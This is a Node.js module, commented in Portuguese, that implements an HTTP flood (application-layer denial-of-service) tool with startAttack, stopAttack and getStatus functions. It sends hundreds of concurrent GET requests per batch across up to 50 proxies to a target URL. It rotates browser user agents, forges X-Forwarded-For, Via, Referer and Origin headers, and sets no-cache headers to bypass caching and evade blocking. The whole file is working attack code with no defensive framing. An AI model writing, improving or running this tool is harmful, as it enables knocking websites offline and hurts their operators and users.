const http = require('http');
const https = require('https');
const url = require('url');
const proxyManager = require('./proxyManager');
const stats = require('./stats');

// Configurações
const CONFIG = {
  maxConcurrency: parseInt(process.env.MAX_CONCURRENCY) || 500,
  batchSize: parseInt(process.env.BATCH_SIZE) || 1000,
  requestsPerProxy: parseInt(process.env.REQUESTS_PER_PROXY) || 100000,
  requestTimeout: 5000,
  userAgents: [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.1.15',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; rv:122.0) Gecko/20100101 Firefox/122.0',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0',
    'Mozilla/5.0 (Linux; Android 14; SM-S921B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.230 Mobile Safari/537.36'
  ],
  commonHeaders: {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
    'Accept-Encoding': 'gzip, deflate, br',
    'Cache-Control': 'no-cache, no-store, must-revalidate',
    'Pragma': 'no-cache',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'none',
    'Sec-Fetch-User': '?1',
    'Upgrade-Insecure-Requests': '1',
    'Referer': 'https://www.google.com/',
    'Origin': 'https://www.google.com',
    'Connection': 'keep-alive'
  }
};

let isRunning = false;
let stopRequested = false;
let activeWorkers = [];

function getRandomUserAgent() {
  return CONFIG.userAgents[Math.floor(Math.random() * CONFIG.userAgents.length)];
}

function buildHeaders(extra = {}) {
  return {
    ...CONFIG.commonHeaders,
    'User-Agent': getRandomUserAgent(),
    ...extra
  };
}

function createAgent(proxyUrl) {
  const parsed = url.parse(proxyUrl);
  const isHttps = parsed.protocol === 'https:';
  const AgentClass = isHttps ? https.Agent : http.Agent;
  
  return new AgentClass({
    keepAlive: true,
    keepAliveMsecs: 1000,
    maxSockets: CONFIG.maxConcurrency,
    maxFreeSockets: CONFIG.maxConcurrency,
    timeout: CONFIG.requestTimeout
  });
}

async function fireRequest(targetUrl, proxyUrl, agent) {
  const parsedTarget = url.parse(targetUrl);
  const isHttps = parsedTarget.protocol === 'https:';
  const headers = buildHeaders({
    'Host': parsedTarget.hostname,
    'X-Forwarded-For': proxyUrl.split('://')[1]?.split(':')[0] || '127.0.0.1',
    'Via': `1.1 ${proxyUrl}`
  });

  const options = {
    hostname: parsedTarget.hostname,
    port: parsedTarget.port || (isHttps ? 443 : 80),
    path: parsedTarget.path || '/',
    method: 'GET',
    headers: headers,
    agent: agent,
    timeout: CONFIG.requestTimeout
  };

  return new Promise((resolve) => {
    const lib = isHttps ? https : http;
    const req = lib.request(options, (res) => {
      res.resume();
      const success = res.statusCode < 400;
      stats.increment(success);
      resolve({ status: res.statusCode, success });
    });
    req.on('error', () => {
      stats.increment(false);
      resolve({ status: 0, success: false });
    });
    req.on('timeout', () => {
      req.destroy();
      stats.increment(false);
      resolve({ status: 0, success: false });
    });
    req.end();
  });
}

async function workerForProxy(proxyUrl, targetUrl, maxRequests) {
  const agent = createAgent(proxyUrl);
  let sent = 0;

  while (!stopRequested && sent < maxRequests) {
    const batchSize = Math.min(CONFIG.batchSize, maxRequests - sent);
    const promises = [];

    for (let i = 0; i < batchSize; i++) {
      promises.push(fireRequest(targetUrl, proxyUrl, agent));
    }

    await Promise.allSettled(promises);
    sent += batchSize;
    
    // Atualizar status no stats
    stats.updateProgress(sent, maxRequests);
  }

  agent.destroy();
  return { proxy: proxyUrl, total: sent };
}

async function startAttack(targetUrl, totalRequests = 0) {
  if (isRunning) {
    throw new Error('Já existe um ataque em andamento.');
  }

  stopRequested = false;
  isRunning = true;
  stats.reset();
  stats.setTarget(targetUrl);
  stats.setTotalRequests(totalRequests);

  console.log(`🚀 INICIANDO ATAQUE em ${targetUrl}`);
  console.log(`📊 Total de requisições: ${totalRequests || 'Ilimitado'}`);

  // Buscar proxies
  const proxies = await proxyManager.getProxies();
  if (proxies.length === 0) {
    isRunning = false;
    throw new Error('Nenhuma proxy disponível.');
  }

  // Limitar número de proxies para não sobrecarregar
  const maxProxies = Math.min(proxies.length, 50);
  const selectedProxies = proxies.slice(0, maxProxies);
  
  const reqPerProxy = totalRequests > 0 ? Math.ceil(totalRequests / selectedProxies.length) : CONFIG.requestsPerProxy;
  const total = selectedProxies.length * reqPerProxy;

  console.log(`🔄 Proxies: ${selectedProxies.length} | Reqs/proxy: ${reqPerProxy} | Total: ${total}`);

  // Disparar workers
  const startTime = Date.now();
  const workerPromises = selectedProxies.map(proxy => workerForProxy(proxy, targetUrl, reqPerProxy));
  
  // Aguardar todos os workers
  const results = await Promise.allSettled(workerPromises);

  // Sumário
  let totalSent = 0;
  for (const result of results) {
    if (result.status === 'fulfilled') {
      totalSent += result.value.total;
    }
  }

  const duration = (Date.now() - startTime) / 1000;
  stats.finish(duration, totalSent);

  console.log(`🏁 ATAQUE FINALIZADO: ${stats.getSummary().successCount} sucessos, ${stats.getSummary().errorCount} erros, ${duration.toFixed(2)}s`);

  isRunning = false;
  return stats.getSummary();
}

function stopAttack() {
  stopRequested = true;
  console.log('🛑 Parando ataque...');
  return { message: 'Ataque interrompido.' };
}

function getStatus() {
  return {
    isRunning,
    stats: stats.getSummary(),
    proxyCount: proxyManager.getProxyCount()
  };
}

module.exports = { startAttack, stopAttack, getStatus };
